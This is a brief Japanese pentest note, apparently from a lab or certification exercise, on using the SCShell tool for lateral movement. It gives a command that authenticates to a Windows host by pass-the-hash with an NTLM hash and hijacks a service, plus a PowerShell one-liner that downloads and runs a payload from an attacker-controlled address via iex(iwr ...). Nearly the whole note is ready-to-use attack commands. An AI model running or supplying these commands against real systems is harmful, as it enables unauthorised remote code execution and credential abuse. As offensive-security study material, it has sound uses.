scshellツール
```
https://github.com/Mr-Un1k0d3r/SCShell
```

pythonでscshell実行
```
python3 scshell.py dave@192.168.235.6 -hashes 00000000000000000000000000000000:2892D26CDF84D7A70E2EB3B9F05C425E -service-name WalletService
```

scshell経由でのペイロード実行
```
cmd.exe /c powershell.exe iex(iwr http://192.168.45.238/prun.txt -UseBasicParsing)
```

実行できるサービスとして記録されてる一覧（追記予定）
```
WalletService
```